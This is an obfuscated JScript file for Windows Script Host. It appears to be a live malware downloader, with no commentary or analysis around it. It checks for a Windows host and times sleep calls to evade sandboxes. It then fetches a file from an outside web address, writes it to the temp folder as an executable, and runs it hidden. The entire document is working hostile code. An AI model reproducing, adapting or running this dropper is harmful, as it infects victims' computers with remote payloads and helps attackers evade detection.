var jU = false;
var c = "CreateObject";
var PG = function GF() {return WScript[c]("WScript.Shell");}(), R = 11;
var E = "MSXML2.XMLHTTP";
var xn = 2123213;
var dr = 0;
function ZP(C){PG["Run"](C, dr, dr);};
function P(){return "" + E;};
function r(S, RN){dr = dr * 1; return S - RN;};
function t(){return c;};
/*@cc_on
  @if (@_win32 || @_win64)
    jU = true;
  @end
@*/
if (jU)
{
var B = "";
function YJ(){return 22;};
var Z = 0; var k = 0;
function W()
{
var K = new this["Date"]();
var tB = K["getUTCMilliseconds"]();
WScript["Sleep"](YJ());
var K = new this["Date"]();
var a = K["getUTCMilliseconds"]();
WScript["Sleep"](YJ());
var K = new this["Date"]();
var j = K["getUTCMilliseconds"]();
var Z = "Mi";
Z = r(a, tB);
var k = "Ur";
k = r(j, a);
B = "open";
return r(Z, k);
}
var t0 = false;
var E0 = false;
for (var P0 = dr; P0 < YJ() * 1; P0++){if (W() != dr){
t0 = true; 
k = "31" + 11 * Z + k; 
E0 = true; 
break;
}}
function lP() {return ((t0 == true) && (t0 == E0)) ? 1 : dr;};
if (t0 && lP() && E0){
function lI() {return PG["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "vZEGC4Asv.exe";};
 Q = P();
 SX = WScript[c](Q);
 var VR = 1;
 while (VR){
try {
SX[B]("GET", "http://fittedcarmats.com/m4usa", false);
SX["send"]();
Vh = "Sleep";
for (;;){WScript[Vh](YJ() * 11); if (SX["readystate"] >= 2 * 2) break;};
VR = dr;
} catch(L){};
}
function Pp(d) {var Ln = (1, 2, 3, 4, 5, d); return Ln;};
gi = WScript[t()]("ADODB.Stream");
Q = gi;
Q[B]();
Q["type"] = Pp(1);
Q["write"](SX["ResponseBody"]);
gi["position"] = Pp(dr);
Q["Save" + "ToFile"](lI(), 2);
gi["c"+"lose"]();
OC = lI();
ZP(OC);
}
}

